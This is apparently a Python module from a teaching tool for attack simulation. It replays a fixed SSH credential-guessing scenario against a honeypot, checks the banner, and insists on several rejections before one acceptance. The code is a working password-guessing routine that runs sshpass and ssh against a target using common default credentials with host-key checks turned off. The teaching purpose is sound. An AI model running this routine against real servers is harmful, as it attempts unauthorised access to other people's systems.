"""Attack modules: scenario — SSH credential sequence.

This is the web-UI form of Trapdoor's own scenarios/ssh-bruteforce.sh. It keeps
that script's central property: a fixed credential list in a fixed order, so
every student gets the same transcript.

It also keeps the script's hard-won precondition check. From the Trapdoor
source, verbatim in spirit:

  "It must contain rejected attempts BEFORE the accepted one. An earlier
   version had root:123456 first — and 123456 IS in userdb.txt, so the
   scenario authenticated on attempt #1 ... The lesson is 'watch a brute
   force fail, fail, fail, then get in.' It was showing one success and zero
   failures. The transcript looked fine and taught the opposite of the lesson."

So this module states how many failures it expects, and fails if the shape is
wrong rather than quietly reporting a different lesson.
"""

from __future__ import annotations

import socket
import time

from ..jobs import Blocked
from ._common import require_tool

NAME = "ssh_cred_sequence"
LABEL = "Scenario: SSH credential sequence"
DESC = "Fixed credential list, fixed order. Expects rejections, then one acceptance. Same transcript every run."
CATEGORY = "scenario"
NEEDS_PORT = True

# Order matters. Every entry except the last must be rejected.
CREDS = [
    ("root", "password", "reject"),
    ("admin", "123456", "reject"),
    ("root", "guess123", "reject"),
    ("admin", "letmein", "reject"),
    ("ubuntu", "changeme", "reject"),
    ("root", "toor", "accept"),
]

EXPECTED_REJECTIONS = sum(1 for _, _, want in CREDS if want == "reject")


def _ssh_banner(target: str, port: int) -> str:
    with socket.create_connection((target, port), timeout=5) as sock:
        sock.settimeout(4)
        return sock.recv(256).decode("utf-8", "replace").strip()


def run(target: str, port: int | None, emit) -> dict:
    if not port:
        raise Blocked("this attack needs a port (SSH, default 2222)")

    emit("[*] precondition 1: port speaks SSH")
    try:
        banner = _ssh_banner(target, port)
    except OSError as exc:
        raise Blocked(f"cannot open {target}:{port}: {exc}") from exc
    emit(f"    banner: {banner!r}")
    if not banner.startswith("SSH-"):
        raise Blocked(f"{target}:{port} did not send an SSH banner")

    emit("")
    emit("[*] precondition 2: sshpass present")
    require_tool("sshpass")
    emit("    found")

    emit("")
    emit("[*] precondition 3: credential list shape")
    emit(f"    {len(CREDS)} pairs, {EXPECTED_REJECTIONS} expected rejections, "
         f"1 expected acceptance")
    emit("    last entry is the acceptance — if a failure list ever starts with")
    emit("    an accepted credential, the lesson inverts without erroring.")
    emit("    two files, one lesson.")
    emit("")

    accepted = 0
    rejections = 0
    for i, (user, password, want) in enumerate(CREDS, 1):
        outcome = _try_ssh(target, port, user, password)
        label = {"accepted": "ACCEPTED", "rejected": "rejected", "error": "ERR"}[outcome]
        emit(f"    [{i}/{len(CREDS)}] {user:>8}:{password:<10} {label}")
        if outcome == "accepted":
            accepted += 1
        elif outcome == "rejected":
            rejections += 1
        time.sleep(0.4)

    emit("")
    if rejections != EXPECTED_REJECTIONS:
        emit(f"[-] FAIL — expected {EXPECTED_REJECTIONS} rejections, saw {rejections}")
        emit("    userdb.txt has drifted from the list. Two files, one lesson.")
        return {
            "status": "fail",
            "summary": f"{rejections} rejections, expected {EXPECTED_REJECTIONS}",
        }
    if accepted != 1:
        emit(f"[-] FAIL — expected exactly 1 acceptance, saw {accepted}")
        return {"status": "fail", "summary": f"{accepted} acceptances, expected 1"}

    emit(f"[+] PASS — {rejections} rejected, 1 accepted, in that order")
    return {"status": "pass", "summary": f"{rejections} rejected then 1 accepted"}




def _try_ssh(target: str, port: int, user: str, password: str) -> str:
    """One login attempt. Returns accepted / rejected / error."""
    import subprocess

    cmd = [
        "sshpass", "-p", password,
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "PreferredAuthentications=password",
        "-o", "PubkeyAuthentication=no",
        "-o", "ConnectTimeout=6",
        "-p", str(port),
        f"{user}@{target}",
        "echo BITWITCH_OK",
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    except subprocess.TimeoutExpired:
        return "error"
    if "BITWITCH_OK" in (proc.stdout or ""):
        return "accepted"
    blob = ((proc.stdout or "") + (proc.stderr or "")).lower()
    if "permission denied" in blob or "authentication failed" in blob:
        return "rejected"
    return "error"
